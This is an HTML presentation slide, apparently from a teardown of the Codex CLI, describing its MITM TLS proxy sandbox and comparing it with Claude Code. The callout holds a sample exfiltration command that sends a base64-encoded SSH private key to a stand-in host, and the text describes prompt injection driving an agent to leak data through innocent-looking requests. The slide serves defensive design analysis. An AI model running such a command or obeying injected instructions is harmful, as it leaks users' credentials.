@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Chapter 03 - Network Proxy MITM</title>
+<style>
+:root{--bg-primary:#0F0F1A;--bg-secondary:#1A1A2E;--bg-card:#16213E;--bg-code:#0D1117;--accent-indigo:#6C63FF;--accent-teal:#00D4AA;--accent-coral:#FF6B6B;--accent-amber:#FFB84D;--accent-green:#48BB78;--text-primary:#FFFFFF;--text-secondary:#A0AEC0;--text-muted:#718096;--border-subtle:#2D3748}
+html{background:var(--bg-primary)}
+body{width:720pt;height:405pt;margin:0;padding:0;font-family:Arial,sans-serif;color:var(--text-primary);display:flex;flex-direction:column;overflow:hidden}
+.header-bar{display:flex;align-items:center;justify-content:space-between;padding:8pt 32pt;background:var(--bg-secondary)}
+.chapter-tag{font-size:8pt;font-weight:700;color:var(--accent-teal);text-transform:uppercase;letter-spacing:1.2pt;margin:0}
+.page-num{font-size:8pt;color:var(--text-muted);margin:0}
+.slide-content{flex:1;display:flex;flex-direction:column;padding:12pt 28pt 6pt 28pt}
+h2{font-size:17pt;font-weight:700;margin:0 0 6pt 0}
+h4{font-size:10pt;font-weight:700;margin:0 0 3pt 0}
+ul{font-size:8.5pt;line-height:1.4;margin:0;padding-left:12pt}
+li{margin-bottom:2pt;color:var(--text-secondary)}
+.fn{font-family:'Courier New',monospace;color:#79C0FF;font-size:8pt}
+.diagram{display:flex;align-items:center;gap:5pt;margin:2pt 0 7pt 0}
+.dbox{background:var(--bg-card);border-radius:3pt;padding:5pt 8pt;text-align:center;flex:1;border:1pt solid var(--border-subtle)}
+.dbox.proxy-box{border-color:var(--accent-teal);flex:1.3}
+.dbox p{margin:0;font-size:7.5pt}
+.dbox .sub{font-size:6.5pt;color:var(--text-muted);margin-top:2pt}
+.arr{flex:0 0 30pt;text-align:center;font-size:8.5pt;color:var(--accent-teal);font-family:'Courier New',monospace}
+.cols{display:flex;gap:10pt;flex:1}
+.col-cross{flex:1;background:var(--bg-card);border-radius:4pt;padding:8pt 10pt;border-top:2.5pt solid var(--accent-teal)}
+.col-nocross{flex:1;background:var(--bg-card);border-radius:4pt;padding:8pt 10pt;border-top:2.5pt solid var(--accent-coral)}
+.callout{background:#16213E;border-left:3pt solid var(--accent-indigo);border-radius:0 4pt 4pt 0;padding:5pt 10pt;margin-top:4pt}
+.callout p{font-size:8.5pt;color:var(--text-secondary);line-height:1.4;margin:0}
+.slide-footer{display:flex;justify-content:space-between;align-items:center;padding:2pt 32pt 4pt 32pt;font-size:7pt;color:var(--text-muted)}
+</style>
+</head>
+<body>
+<div class="header-bar"><p class="chapter-tag">Codex Teardown · Ch3 Native Sandboxing</p><p class="page-num">07 / 10</p></div>
+<div class="slide-content">
+  <h2>网络代理 — 全功能 MITM TLS 拦截</h2>
+  <div class="diagram">
+    <div class="dbox"><p>沙箱子进程</p><p class="sub">via HTTPS_PROXY env</p></div>
+    <div class="arr"><p>──TLS──►</p></div>
+    <div class="dbox proxy-box"><p style="color:var(--accent-teal);font-weight:700;">Codex MITM Proxy</p><p class="sub">in-process · network-proxy crate</p><p class="sub">mitm.rs · certs.rs · network_policy.rs</p></div>
+    <div class="arr"><p>──TLS──►</p></div>
+    <div class="dbox"><p>api.example.com</p><p class="sub">真实 TLS 握手</p></div>
+  </div>
+  <div class="cols">
+    <div class="col-cross">
+      <h4 style="color:var(--accent-teal);">MITM 工作流程（6 步）</h4>
+      <ul>
+        <li>子进程发起 HTTPS 请求，被 <span class="fn">HTTPS_PROXY</span> 路由到 in-process 代理</li>
+        <li>代理用动态生成 CA cert（<span class="fn">certs.rs</span>）伪造 server cert，与子进程 TLS 握手</li>
+        <li>代理自己以真实 client 身份与目标域 TLS 握手</li>
+        <li>解密明文请求，<span class="fn">NetworkPolicyDecider</span> 评估域名 + 路径 + HTTP method</li>
+        <li>允许 → 转发；拒绝 → 返回 403</li>
+        <li>绕过代理的连接被 Landlock/seccomp 直接 block</li>
+      </ul>
+    </div>
+    <div class="col-nocross">
+      <h4 style="color:var(--accent-coral);">为什么不只看 SNI？</h4>
+      <ul>
+        <li>SNI 只能以域为粒度拒绝</li>
+        <li>MITM 可区分 <span class="fn">GET github.com/...</span> vs <span class="fn">POST github.com/...</span></li>
+        <li>prompt-injection 可能让 agent "GET 看似无害 URL"实则带 exfiltration 参数</li>
+        <li>method + path + headers 三维联合判断才能防住这类攻击</li>
+        <li>代价：cert 生命周期管理（<span class="fn">certs.rs</span> 负责注入与清理）</li>
+      </ul>
+    </div>
+  </div>
+  <div class="callout"><p><strong style="color:var(--accent-coral);">Claude Code 无此层：</strong>直接 spawn curl / fetch，无代理，无过滤，无 MITM。若 LLM 被 injection 驱动执行 <span class="fn">curl https://exfiltrate.com?data=$(cat ~/.ssh/id_rsa | base64)</span>，permission prompt 被绕过后<strong style="color:var(--text-primary);">没有第二道防线</strong>。</p></div>
+</div>
+<div class="slide-footer"><p>Lumina · Codex CLI Teardown</p><p>07 / 10</p></div>
+</body>
+</html>
